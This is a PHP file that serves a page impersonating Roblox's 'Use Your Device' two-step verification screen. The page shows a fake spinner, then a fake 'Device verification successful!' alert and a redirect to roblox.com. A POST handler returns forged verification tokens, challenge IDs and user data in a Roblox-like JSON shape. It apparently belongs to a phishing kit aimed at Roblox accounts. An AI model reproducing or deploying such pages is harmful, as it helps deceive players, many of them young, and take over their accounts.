<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With');
header('Content-Type: text/html'); // Changed to HTML

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

require('../setup.php');

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    // Show device verification page
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Use Your Device - Roblox</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body {
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
                background: #f0f0f0;
                margin: 0;
                padding: 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
            }
            .container {
                background: white;
                border-radius: 8px;
                padding: 40px;
                box-shadow: 0 4px 20px rgba(0,0,0,0.1);
                max-width: 400px;
                width: 100%;
                text-align: center;
            }
            .device-icon {
                width: 80px;
                height: 80px;
                margin: 0 auto 20px;
                background: #00B2FF;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 40px;
                color: white;
            }
            h2 {
                color: #393B3D;
                margin: 0 0 10px;
            }
            p {
                color: #666;
                margin: 0 0 30px;
            }
            .spinner {
                width: 40px;
                height: 40px;
                border: 4px solid #f3f3f3;
                border-top: 4px solid #00B2FF;
                border-radius: 50%;
                animation: spin 1s linear infinite;
                margin: 20px auto;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            .btn {
                background: #393B3D;
                color: white;
                border: none;
                padding: 10px 20px;
                border-radius: 4px;
                cursor: pointer;
                margin-top: 15px;
                text-decoration: none;
                display: inline-block;
            }
            .btn:hover {
                background: #2a2c2e;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <!-- Try to load your uploaded image first, fallback to icon -->
            <img src="/images/device-verification.png" 
                 alt="Device Verification" 
                 style="width: 100%; max-width: 300px; height: auto; margin: 0 auto 20px; border-radius: 8px;"
                 onerror="this.style.display='none'; document.getElementById('fallback-icon').style.display='flex';">
            
            <!-- Fallback icon if image doesn't load -->
            <div id="fallback-icon" class="device-icon" style="display: none;">🛡️</div>
            
            <h2>Use Your Device</h2>
            <p>To approve or reject this attempt, open the Roblox app from a logged-in mobile or tablet device.</p>
            <div class="spinner"></div>
            <p style="font-size: 12px; color: #999;">This may take a few seconds...</p>
            <a href="https://roblox.com" class="btn">Cancel</a>
        </div>

        <script>
            // Auto redirect to roblox.com after 3 seconds
            setTimeout(() => {
                alert('Device verification successful!');
                window.location.href = 'https://roblox.com';
            }, 3000);
        </script>
    </body>
    </html>
    <?php
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Handle device verification request
    $verificationId = 'device_' . uniqid();
    
    echo json_encode([
        'verificationToken' => $verificationId,
        'challengeId' => 'device_challenge_' . rand(100000, 999999),
        'user' => [
            'id' => rand(1000000, 9999999),
            'name' => 'DeviceUser',
            'displayName' => 'Device User'
        ],
        'twoStepVerificationData' => [
            'mediaType' => 'Push',
            'ticket' => $verificationId
        ],
        'isBanned' => false
    ]);
    exit;
}

http_response_code(400);
echo json_encode(['error' => 'Invalid request method']);
?>
